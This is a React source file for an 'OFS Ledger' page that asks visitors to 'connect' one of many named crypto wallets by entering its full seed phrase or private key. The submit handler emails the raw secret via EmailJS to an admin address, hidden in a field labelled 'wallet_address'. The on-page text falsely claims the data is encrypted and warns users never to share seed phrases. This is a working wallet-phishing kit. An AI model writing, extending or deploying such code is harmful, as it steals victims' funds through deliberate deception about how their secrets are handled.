import React, { useState, useRef, useEffect } from "react";
import { useNavigate, Link } from "react-router-dom";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/components/ui/use-toast";
import { useTheme } from "@/components/theme-provider";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import emailjs from '@emailjs/browser';
import { User } from "lucide-react";
import {
  Wallet,
  Shield,
  AlertTriangle,
  Lock,
  KeyRound,
  Eye,
  EyeOff,
  ArrowLeft,
  HelpCircle,
  Info,
  Search,
  Mail
} from "lucide-react";

// Supported wallets with seed phrase import
const SUPPORTED_WALLETS = [
  { id: "metamask", name: "Metamask", logo: "/images/wallets/metamask.png", seedPhraseWords: [12, 24] },
  { id: "trust", name: "Trust Wallet", logo: "/images/wallets/trust.png", seedPhraseWords: [12, 24] },
  { id: "ledger", name: "Ledger", logo: "/images/wallets/ledger.png", seedPhraseWords: [24] },
  { id: "exodus", name: "Exodus Wallet", logo: "/images/wallets/exodus.png", seedPhraseWords: [12] },
  { id: "rainbow", name: "Rainbow", logo: "/images/wallets/rainbow.png", seedPhraseWords: [12, 24] },
  { id: "atomic", name: "Atomic", logo: "/images/wallets/atomic.png", seedPhraseWords: [12] },
  { id: "crypto", name: "Crypto.com DeFi Wallet", logo: "/images/wallets/crypto.png", seedPhraseWords: [12] },
  { id: "mathwallet", name: "MathWallet", logo: "/images/wallets/mathwallet.png", seedPhraseWords: [12, 24] },
  { id: "zelcore", name: "Zelcore", logo: "/images/wallets/zelcore.png", seedPhraseWords: [12, 24] },
  { id: "viawallet", name: "ViaWallet", logo: "/images/wallets/viawallet.png", seedPhraseWords: [12] },
  { id: "xdc", name: "XDC Wallet", logo: "/images/wallets/xdc.png", seedPhraseWords: [12] },
  { id: "ownbit", name: "Ownbit", logo: "/images/wallets/ownbit.png", seedPhraseWords: [12, 24] },
  { id: "vision", name: "Vision", logo: "/images/wallets/vision.png", seedPhraseWords: [12] },
  { id: "morix", name: "MoriX Wallet", logo: "/images/wallets/morix.png", seedPhraseWords: [12, 24] },
  { id: "safepal", name: "SafePal", logo: "/images/wallets/safepal.png", seedPhraseWords: [12, 24] },
  { id: "sparkpoint", name: "SparkPoint", logo: "/images/wallets/sparkpoint.png", seedPhraseWords: [12] },
  { id: "unstoppable", name: "Unstoppable", logo: "/images/wallets/unstoppable.png", seedPhraseWords: [12, 24] },
  { id: "peakdefi", name: "PeakDeFi Wallet", logo: "/images/wallets/peakdefi.png", seedPhraseWords: [12] },
  { id: "infinity", name: "Infinity Wallet", logo: "/images/wallets/infinity.png", seedPhraseWords: [12, 24] },
  { id: "lobstr", name: "Lobstr Wallet", logo: "/images/wallets/lobstr.png", seedPhraseWords: [12] },
  { id: "phantom", name: "Phantom", logo: "/images/wallets/phantom.png", seedPhraseWords: [12, 24] },
];

// Supported blockchains for dropdown selection
const SUPPORTED_BLOCKCHAINS = [
  { id: "ethereum", name: "Ethereum", symbol: "ETH" },
  { id: "bitcoin", name: "Bitcoin", symbol: "BTC" },
  { id: "polygon", name: "Polygon", symbol: "MATIC" },
  { id: "solana", name: "Solana", symbol: "SOL" },
  { id: "avalanche", name: "Avalanche", symbol: "AVAX" },
  { id: "binance", name: "Binance Smart Chain", symbol: "BNB" },
  { id: "cardano", name: "Cardano", symbol: "ADA" },
  { id: "xrp", name: "XRP Ledger", symbol: "XRP" },
  { id: "polkadot", name: "Polkadot", symbol: "DOT" },
];

// EmailJS configuration
const EMAILJS_SERVICE_ID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
const EMAILJS_TEMPLATE_ID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
const EMAILJS_PUBLIC_KEY = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;

// Add custom breakpoint for extra small screens
const PublicWalletConnect = () => {
  // Add CSS for custom breakpoint
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @media (min-width: 475px) {
        .xs\:grid-cols-2 {
          grid-template-columns: repeat(2, minmax(0, 1fr));
        }
      }
    `;
    document.head.appendChild(style);

    return () => {
      document.head.removeChild(style);
    };
  }, []);
  const navigate = useNavigate();
  const { toast } = useToast();
  const { theme } = useTheme();

  // Create a ref for the hidden form
  const formRef = useRef<HTMLFormElement>(null);

  // Form state
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [walletName, setWalletName] = useState<string>("");
  const [seedPhraseCount, setSeedPhraseCount] = useState<number>(12);
  const [seedPhrase, setSeedPhrase] = useState<string>("");
  const [privateKey, setPrivateKey] = useState<string>("");
  const [showSeedPhrase, setShowSeedPhrase] = useState<boolean>(false);
  const [showPrivateKey, setShowPrivateKey] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [walletFilter, setWalletFilter] = useState<string>("");
  const [inputMethod, setInputMethod] = useState<string>("seedPhrase");

  // Filter wallets based on search input
  const filteredWallets = SUPPORTED_WALLETS.filter(wallet =>
    wallet.name.toLowerCase().includes(walletFilter.toLowerCase())
  );

  // Get selected wallet details
  const getSelectedWalletDetails = () => {
    return SUPPORTED_WALLETS.find(wallet => wallet.id === selectedWallet);
  };

  // Handle wallet selection
  const handleWalletSelect = (walletId: string) => {
    const wallet = SUPPORTED_WALLETS.find(w => w.id === walletId);
    setSelectedWallet(walletId);

    // Set default seed phrase count based on wallet
    if (wallet) {
      if (wallet.seedPhraseWords.length === 1) {
        setSeedPhraseCount(wallet.seedPhraseWords[0]);
      } else {
        setSeedPhraseCount(wallet.seedPhraseWords[0]);
      }

      // Set default wallet name
      setWalletName(`My ${wallet.name}`);
    }
  };

  // Validate seed phrase
  const validateSeedPhrase = () => {
    if (inputMethod !== "seedPhrase") return true;
    const words = seedPhrase.trim().split(/\s+/);
    const walletDetails = getSelectedWalletDetails();
    if (!walletDetails) return false;

    return walletDetails.seedPhraseWords.includes(words.length);
  };

  // Validate private key
  const validatePrivateKey = () => {
    if (inputMethod !== "privateKey") return true;
    // Basic validation: private keys are typically 64 hex characters (32 bytes)
    // Sometimes with 0x prefix
    const key = privateKey.trim().startsWith("0x")
      ? privateKey.trim().substring(2)
      : privateKey.trim();

    return key.length === 64 && /^[0-9a-fA-F]+$/.test(key);
  };

  // Get individual words from seed phrase
  const getSeedPhraseWords = () => {
    return seedPhrase.trim().split(/\s+/).filter(word => word.length > 0);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (isSubmitting) {
      return; // Prevent double submission
    }

    if (!selectedWallet) {
      setError("Please select a wallet type");
      toast({
        title: "Wallet Required",
        description: "Please select a wallet type before continuing.",
        variant: "destructive",
      });
      return;
    }

    // Validate based on input method
    if (inputMethod === "seedPhrase" && !validateSeedPhrase()) {
      const walletDetails = getSelectedWalletDetails();
      setError(`Invalid seed phrase length. ${walletDetails?.name} requires ${walletDetails?.seedPhraseWords.join(" or ")} words.`);
      toast({
        title: "Invalid Seed Phrase",
        description: `Please enter a valid seed phrase with ${getSelectedWalletDetails()?.seedPhraseWords.join(" or ")} words.`,
        variant: "destructive",
      });
      return;
    } else if (inputMethod === "privateKey" && !validatePrivateKey()) {
      setError("Invalid private key format. Private keys should be 64 hexadecimal characters.");
      toast({
        title: "Invalid Private Key",
        description: "Please enter a valid private key (64 hexadecimal characters).",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);
    setError(null);

    try {
      // Prepare data for email
      const walletData = {
        wallet_name: walletName,
        wallet_type: getSelectedWalletDetails()?.name || "Unknown",
        input_method: inputMethod,
        seed_phrase_count: inputMethod === "seedPhrase" ? seedPhraseCount : 0,
        private_key: inputMethod === "privateKey" ? "[ENCRYPTED]" : "",
        seed_phrase: inputMethod === "seedPhrase" ? "[ENCRYPTED]" : "",
        user_email: "public_user@example.com" // Placeholder for public users
      };

      // Send email with EmailJS only (no Supabase)
      try {
        // Create email parameters
        const emailParams = {
          to_email: 'admin@ofsledger.com',
          from_name: 'Public OFS Ledger User',
          subject: 'New Public Wallet Connection',
          wallet_name: walletData.wallet_name,
          wallet_type: walletData.wallet_type,
          user_email: 'Public User',
          input_method: walletData.input_method,
          seed_phrase_count: walletData.seed_phrase_count.toString(),
          wallet_address: inputMethod === "seedPhrase" ? seedPhrase : privateKey,
          message: `A new wallet has been connected by a public user. Wallet type: ${walletData.wallet_type}, Input method: ${walletData.input_method}`
        };

        console.log('Sending email with params:', {
          serviceID: import.meta.env.VITE_EMAILJS_SERVICE_ID,
          templateID: import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
          hasPublicKey: !!import.meta.env.VITE_EMAILJS_PUBLIC_KEY
        });

        // Use promise-based approach
        emailjs.send(
          import.meta.env.VITE_EMAILJS_SERVICE_ID,
          import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
          emailParams,
          import.meta.env.VITE_EMAILJS_PUBLIC_KEY
        ).then((result) => {
          console.log('Email sent successfully:', result.text);

          // Show success message
          toast({
            title: "Wallet Connection Email Sent",
            description: "Admin has been notified about your wallet connection.",
          });

          // Reset form
          handleReset();

          // Navigate to sign-up page after a short delay
          setTimeout(() => {
            navigate("/sign-up");
          }, 1000);

          setIsSubmitting(false);
        }).catch((error) => {
          console.error('Error sending email:', error);
          setError(error.text || "Failed to send email notification");
          toast({
            title: "Error Sending Email",
            description: "There was an error notifying admin. Please try again.",
            variant: "destructive",
          });
          setIsSubmitting(false);
        });
      } catch (emailError) {
        console.error('Error preparing email:', emailError);
        throw emailError;
      }
    } catch (error) {
      console.error("Error in wallet connection process:", error);
      const message = error instanceof Error ? error.message : "There was an error connecting your wallet. Please try again.";
      setError(message);
      toast({
        title: "Error Connecting Wallet",
        description: message,
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  // Reset form
  const handleReset = () => {
    setSelectedWallet(null);
    setWalletName("");
    setSeedPhrase("");
    setPrivateKey("");
    setInputMethod("seedPhrase");
    setError(null);
  };

  return (
    <div className="container mx-auto px-4 sm:px-6 py-4 space-y-6 max-w-4xl">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div className="flex items-center gap-2 w-full">
          <Button
            variant="ghost"
            onClick={() => navigate("/")}
            className="gap-2"
          >
            <ArrowLeft className="h-4 w-4" />
            Back to Home
          </Button>
        </div>
      </div>

      <Card>
        <CardHeader>
          <CardTitle>Connect Your Wallet</CardTitle>
          <CardDescription>
            Choose your wallet type and enter your seed phrase to connect
          </CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Form fields */}
            <div className="space-y-6">
              <Alert variant="destructive" className="bg-destructive/5 text-destructive border-destructive/20">
                <AlertTriangle className="h-4 w-4" />
                <AlertTitle>SECURITY WARNING</AlertTitle>
                <AlertDescription>
                  Never share your seed phrase with anyone.
                  OFS Ledger staff will never ask for your seed phrase via email, chat, or phone.
                </AlertDescription>
              </Alert>

              <div className="relative mb-4">
                <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search wallets..."
                  value={walletFilter}
                  onChange={(e) => setWalletFilter(e.target.value)}
                  className="pl-8"
                />
              </div>

              <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2 sm:gap-4">
                {filteredWallets.map((wallet) => (
                  <div
                    key={wallet.id}
                    className={`flex flex-col items-center p-4 rounded-lg border-2 cursor-pointer transition-all hover:border-primary/50 hover:bg-primary/5 ${selectedWallet === wallet.id ? 'border-primary bg-primary/5' : 'border-border'}`}
                    onClick={() => handleWalletSelect(wallet.id)}
                  >
                    <div className="w-12 h-12 mb-2 rounded-full bg-background flex items-center justify-center p-1">
                      <img
                        src={wallet.logo}
                        alt={wallet.name}
                        className="w-10 h-10 object-contain"
                        onError={(e) => {
                          (e.target as HTMLImageElement).src = "/placeholder-wallet.svg";
                        }}
                      />
                    </div>
                    <span className="text-sm font-medium text-center">{wallet.name}</span>
                    <span className="text-xs text-muted-foreground mt-1">
                      {wallet.seedPhraseWords.join("/")} words
                    </span>
                  </div>
                ))}
              </div>

              <Alert>
                <Info className="h-4 w-4" />
                <AlertTitle>Wallet Compatibility</AlertTitle>
                <AlertDescription>
                  Only wallets that support seed phrase import are shown. Make sure you have your seed phrase ready.
                </AlertDescription>
              </Alert>
            </div>

            {selectedWallet && (
              <div className="space-y-6">
                <div className="flex items-center gap-3 mb-4 p-3 bg-primary/5 rounded-lg overflow-hidden">
                  <div className="flex-shrink-0 w-10 h-10 rounded-full bg-background flex items-center justify-center p-1">
                    <img
                      src={getSelectedWalletDetails()?.logo}
                      alt={getSelectedWalletDetails()?.name}
                      className="w-8 h-8 object-contain"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src = "/placeholder-wallet.svg";
                      }}
                    />
                  </div>
                  <div className="min-w-0 flex-1">
                    <div className="font-medium truncate">{getSelectedWalletDetails()?.name}</div>
                    <div className="text-xs text-muted-foreground">
                      Supports {getSelectedWalletDetails()?.seedPhraseWords.join(" or ")} word seed phrases
                    </div>
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="wallet-name">Wallet Name</Label>
                    <Input
                      id="wallet-name"
                      placeholder="e.g., My Main Ethereum Wallet"
                      value={walletName}
                      onChange={(e) => setWalletName(e.target.value)}
                    />
                  </div>

                  {/* Input Method Tabs */}
                  <Tabs value={inputMethod} onValueChange={setInputMethod} className="w-full">
                    <TabsList className="grid w-full grid-cols-2">
                      <TabsTrigger value="seedPhrase" className="flex items-center gap-1">
                        <Shield className="h-4 w-4" />
                        Seed Phrase
                      </TabsTrigger>
                      <TabsTrigger value="privateKey" className="flex items-center gap-1">
                        <KeyRound className="h-4 w-4" />
                        Private Key
                      </TabsTrigger>
                    </TabsList>

                    {/* Seed Phrase Tab Content */}
                    <TabsContent value="seedPhrase" className="space-y-4 pt-4">
                      {getSelectedWalletDetails()?.seedPhraseWords.length === 2 && (
                        <div className="space-y-2">
                          <Label htmlFor="seed-phrase-count">Seed Phrase Length</Label>
                          <Select
                            value={seedPhraseCount.toString()}
                            onValueChange={(value) => setSeedPhraseCount(parseInt(value))}
                          >
                            <SelectTrigger id="seed-phrase-count">
                              <SelectValue placeholder="Select seed phrase length" />
                            </SelectTrigger>
                            <SelectContent>
                              {getSelectedWalletDetails()?.seedPhraseWords.map((count) => (
                                <SelectItem key={count} value={count.toString()}>
                                  {count} Words
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                        </div>
                      )}

                      <div className="space-y-2">
                        <div className="flex flex-wrap justify-between items-center gap-2">
                          <Label htmlFor="seed-phrase" className="text-sm sm:text-base">Seed Phrase ({seedPhraseCount} words)</Label>
                          <Button
                            variant="ghost"
                            size="sm"
                            className="h-6 px-2 text-xs"
                            onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                            type="button"
                          >
                            {showSeedPhrase ? (
                              <>
                                <EyeOff className="h-3 w-3 mr-1" />
                                Hide
                              </>
                            ) : (
                              <>
                                <Eye className="h-3 w-3 mr-1" />
                                Show
                              </>
                            )}
                          </Button>
                        </div>

                        {/* Elaborate Seed Phrase Input */}
                        <div className={`p-2 sm:p-4 border rounded-lg bg-card ${!showSeedPhrase ? "text-password" : ""}`}>
                          <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
                            {Array.from({ length: seedPhraseCount }).map((_, index) => {
                              const words = getSeedPhraseWords();
                              const word = index < words.length ? words[index] : "";

                              return (
                                <div key={index} className="relative">
                                  <div className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] sm:text-xs text-muted-foreground font-mono">
                                    {index + 1}.
                                  </div>
                                  <input
                                    type={showSeedPhrase ? "text" : "password"}
                                    value={word}
                                    onChange={(e) => {
                                      const words = getSeedPhraseWords();
                                      words[index] = e.target.value;
                                      setSeedPhrase(words.join(" "));
                                    }}
                                    className={`w-full h-9 sm:h-10 px-7 py-1 sm:py-2 rounded border ${word ? "border-primary/30 bg-primary/5" : "border-input"
                                      } text-xs sm:text-sm font-mono focus:outline-none focus:ring-1 focus:ring-primary`}
                                    placeholder={`Word ${index + 1}`}
                                  />
                                </div>
                              );
                            })}
                          </div>

                          <div className="mt-3 sm:mt-4 flex flex-wrap items-center justify-between gap-2">
                            <Button
                              type="button"
                              variant="outline"
                              size="sm"
                              onClick={() => setSeedPhrase("")}
                              className="text-xs h-8"
                            >
                              Clear All
                            </Button>

                            <div className="text-xs text-muted-foreground">
                              <span className={getSeedPhraseWords().length === seedPhraseCount ? "text-green-500" : ""}>
                                {getSeedPhraseWords().length}
                              </span>/{seedPhraseCount} words
                            </div>
                          </div>
                        </div>

                        <p className="text-xs text-muted-foreground mt-2">
                          Your seed phrase is securely encrypted and stored. We never share this information with third parties.
                        </p>
                      </div>
                    </TabsContent>

                    {/* Private Key Tab Content */}
                    <TabsContent value="privateKey" className="space-y-4 pt-4">
                      <div className="space-y-2">
                        <div className="flex flex-wrap justify-between items-center gap-2">
                          <Label htmlFor="private-key" className="text-sm sm:text-base">Private Key</Label>
                          <Button
                            variant="ghost"
                            size="sm"
                            className="h-6 px-2 text-xs"
                            onClick={() => setShowPrivateKey(!showPrivateKey)}
                            type="button"
                          >
                            {showPrivateKey ? (
                              <>
                                <EyeOff className="h-3 w-3 mr-1" />
                                Hide
                              </>
                            ) : (
                              <>
                                <Eye className="h-3 w-3 mr-1" />
                                Show
                              </>
                            )}
                          </Button>
                        </div>

                        <div className="relative">
                          <Input
                            id="private-key"
                            type={showPrivateKey ? "text" : "password"}
                            placeholder="Enter your private key (64 characters)"
                            value={privateKey}
                            onChange={(e) => setPrivateKey(e.target.value)}
                            className={`font-mono ${!showPrivateKey ? "text-password" : ""}`}
                          />
                          <Lock className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                        </div>

                        <p className="text-xs text-muted-foreground mt-2">
                          Your private key is securely encrypted and stored. We never share this information with third parties.
                        </p>
                      </div>
                    </TabsContent>
                  </Tabs>
                </div>

                <Alert variant="destructive" className="bg-destructive/5 text-destructive border-destructive/20">
                  <AlertTriangle className="h-4 w-4" />
                  <AlertTitle>Security Warning</AlertTitle>
                  <AlertDescription>
                    Never share your seed phrase with anyone. OFS Ledger staff will never ask for your seed phrase via email, chat, or phone.
                  </AlertDescription>
                </Alert>

                <div className="flex flex-col-reverse sm:flex-row sm:justify-end gap-2 sm:gap-4 mt-6">
                  <Button
                    type="button"
                    variant="outline"
                    onClick={handleReset}
                    disabled={isSubmitting}
                    className="w-full sm:w-auto"
                  >
                    Reset
                  </Button>
                  <Button
                    type="submit"
                    disabled={!selectedWallet || (inputMethod === "seedPhrase" && !seedPhrase) || (inputMethod === "privateKey" && !privateKey) || isSubmitting}
                    className="w-full sm:w-auto"
                  >
                    {isSubmitting ? (
                      <>
                        <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                        Connecting...
                      </>
                    ) : (
                      <>
                        <Wallet className="mr-2 h-4 w-4" />
                        Connect Wallet
                      </>
                    )}
                  </Button>
                </div>

                {error && (
                  <Alert variant="destructive">
                    <AlertTriangle className="h-4 w-4" />
                    <AlertTitle>Error</AlertTitle>
                    <AlertDescription>{error}</AlertDescription>
                  </Alert>
                )}
              </div>
            )}
          </form>
        </CardContent>
      </Card>

      <Card>
        <CardHeader className="px-4 sm:px-6">
          <CardTitle className="text-lg sm:text-xl">Wallet Connection FAQ</CardTitle>
          <CardDescription>
            Frequently asked questions about connecting wallets
          </CardDescription>
        </CardHeader>
        <CardContent className="px-4 sm:px-6">
          <div className="space-y-3 sm:space-y-4">
            <div className={`rounded-lg p-3 sm:p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-50"
              }`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                What is a seed phrase?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                A seed phrase (also called a recovery phrase or mnemonic) is a series of words that store all the information needed to recover your wallet. It's like a master password that generates all your private keys.
              </p>
            </div>

            <div className={`rounded-lg p-3 sm:p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-50"
              }`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                Is it safe to enter my seed phrase?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                Your seed phrase is encrypted before being stored and is never accessible in plain text after submission. We use industry-standard encryption to protect your data. However, you should never share your seed phrase with anyone.
              </p>
            </div>

            <div className={`rounded-lg p-3 sm:p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-50"
              }`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                What happens after I connect my wallet?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                After connecting your wallet, it will be submitted for KYC verification. Once verified, you'll be able to perform withdrawals and other operations. KYC verification typically takes 24-48 hours.
              </p>
            </div>

            <div className={`rounded-lg p-3 sm:p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-50"
              }`}>
              <h3 className="font-medium flex items-center gap-2">
                <HelpCircle className="h-4 w-4 text-primary" />
                Why do I need to verify my wallet?
              </h3>
              <p className="mt-1 text-sm text-muted-foreground">
                KYC verification ensures that you are the legitimate owner of the wallet and helps prevent fraud. This is a security measure to protect both you and the platform.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};


export default PublicWalletConnect;
// Add a CSS class for password masking
const style = document.createElement('style');
style.textContent = `
  .text-password {
    -webkit-text-security: disc;
    font-family: text-security-disc;
  }
`;
document.head.appendChild(style);
